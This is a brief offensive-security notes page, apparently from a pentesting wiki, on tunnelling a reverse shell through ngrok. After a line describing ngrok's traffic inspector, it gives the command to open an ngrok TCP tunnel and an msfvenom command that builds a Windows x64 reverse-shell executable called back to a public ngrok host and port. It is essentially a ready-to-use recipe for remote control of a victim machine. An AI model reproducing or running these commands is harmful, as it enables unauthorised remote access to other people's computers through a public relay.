# ngrok

ngrok provides a real-time web UI where you can introspect all HTTP traffic running over your tunnels. Replay any request against your tunnel with one click.

### Reverse Shell

{% hint style="info" %}

{% endhint %}

```bash
ngrok tcp 4444
```

We create our reverse shell with msfvenom, where it will point to our created ngrok server, which if it receives a connection, the traffic will be redirected to the port we have indicated:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=6.tcp.ngrok.io LPORT=15343 -f exe > shell.exe
```
